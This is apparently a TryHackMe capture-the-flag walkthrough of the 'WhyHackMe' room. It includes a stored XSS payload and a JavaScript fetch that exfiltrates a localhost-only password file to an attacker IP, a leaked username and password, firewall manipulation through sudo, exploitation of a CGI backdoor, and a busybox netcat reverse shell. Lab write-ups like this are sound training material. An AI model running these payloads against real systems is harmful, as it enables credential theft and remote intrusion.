---
tags:
  - THM
  - Linux
  - Medium
  - Leakage
  - XSS
  - Security-SW
  - Sudo
  - RCE
---
https://tryhackme.com/room/whyhackme/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.177.141 whyhackme.thm
```
# Scanning
```console
$ nmap -p21,22,80 -sV -sC whyhackme.thm

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.150.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

After the anonymous FTP login and checking `update.txt`, we know there is a **password file** at `/dir/pass.txt`:
```text
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

The **password file** exists, but we can not access it externally:
```console
$ curl -s http://whyhackme.thm/dir/pass.txt

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at whyhackme.thm Port 80</address>
</body></html>
```

The website is just a PHP blog allowing users to comment. Found some valid endpoints:
```console
$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'http://whyhackme.thm/FUZZ'
...
index.php               [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 118ms]
register.php            [Status: 200, Size: 643, Words: 36, Lines: 23, Duration: 120ms]
login.php               [Status: 200, Size: 523, Words: 45, Lines: 21, Duration: 121ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 121ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 116ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 117ms]
.                       [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 114ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 115ms]
blog.php                [Status: 200, Size: 3102, Words: 422, Lines: 23, Duration: 114ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 116ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 112ms]
.htm                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 110ms]
.htpasswds              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 114ms]
.htgroup                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 109ms]
wp-forum.phps           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 114ms]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 109ms]
.htuser                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 113ms]
.htc                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 113ms]
.ht                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 113ms]
```

# Exploitation

After spending some time figuring out how the website works, realized that our **username** and comments are shown in `/blog.php`. And after some tests, realized that the **username** is not being sanitized. So, created a malicious one at `/register.php`:
```html
<script src="http://192.168.150.216:8000/a.js"></script>
```

Then, commented anything at `/blog.php` so we control that loaded JavaScript file.

I tried cookie hijacking but the website has the **HttpOnly** attribute set so we can not access the cookies via JavaScript. So, I assumed that a person inside the target machine would see the website anytime, allowing me to see the **password file** at `/dir/pass.txt`. So, I modified the `a.js` file to access the internal resource and send the response:
```javascript
fetch("http://127.0.0.1/dir/pass.txt")
    .then(response => response.text())
    .then(data => {
        fetch("http://192.168.150.216:443", {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'data=' + encodeURIComponent(data)
        });
    });
```

Now, we host the `a.js` file using a Python server:
```console
$ python3 -m http.server 8000
```

Then we wait and read the response:
```console
$ nc -lvnp 443

POST / HTTP/1.1
Host: 192.168.150.216:443
Connection: keep-alive
Content-Length: 41
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://127.0.0.1/blog.php
Accept-Encoding: gzip, deflate

data=jack%3AWhyIsMyPasswordSoStrongIDK%0A
```

We decode the **credentials**:
```console
$ echo -n "jack%3AWhyIsMyPasswordSoStrongIDK%0A" | urlencode -d

jack:WhyIsMyPasswordSoStrongIDK
```

Finally, we log in via SSH as **user jack** and get the **user flag**:
```console
$ sshpass -p 'WhyIsMyPasswordSoStrongIDK' ssh jack@whyhackme.thm
...

$ cat /home/jack/user.txt
```

# Post-Exploitation

According to `/opt` files, there is a **backdoor** running somewhere but supposedly being blocked by `iptables`:
```console
$ ls /opt
capture.pcap  urgent.txt

$ cat /opt/urgent.txt 
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.

$ ls /usr/lib/cgi-bin/
ls: cannot open directory '/usr/lib/cgi-bin/': Permission denied
```

Now, we transfer the `capture.pcap` file to our local machine and open it. We can only see encrypted and TLS traffic:
```console
$ wireshark capture.pcap
```

We can run `/usr/sbin/iptables` using `sudo`:
```console
$ sudo -l

Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

We can see that there is something running on port 41312 but being blocked by firewall rules. It is likely the **backdoor**:
```console
$ ss -tulnp | grep 41312
tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*

$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere
```

So, we delete the rule and allow external access to the **backdoor**:
```console
$ sudo /usr/sbin/iptables -D INPUT

$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```

We verify that the port is now open. It is just an Apache HTTPs website with every resource returning forbidden status (403).
```console
$ nmap -p41312 -sV -sC whyhackme.thm
...
PORT      STATE SERVICE VERSION
41312/tcp open  http    Apache httpd 2.4.41
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: www.example.com

$ curl -k -s 'https://whyhackme.thm:41312'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at whyhackme.thm Port 41312</address>
</body></html>
```

So, we steal the Apache SSL certificate at `/etc/apache2/certs/apache.key` and import it to `wireshark` via *Edit -> Preferences -> Protocols -> TLS -> RSA Keys List*.

And now if we filter for `http`, we will see a GET request to an endpoint which allows RCE. So, we test it:
```console
$ curl -k -s 'https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'

<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>
```

From our attacker's machine, we listen for connections:
```console
$ nc -lvnp 4444
```

Now, we get a reverse shell as **www-data**:
```console
$ cmd=$(echo -n 'busybox nc 192.168.150.216 4444 -e /bin/sh' | urlencode -a)

$ curl -k -s "https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=$cmd"
```

We can run any command using `sudo`, so we become **root** and get the **root flag**:
```console
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL

$ sudo su

# cat /root/root.txt
```
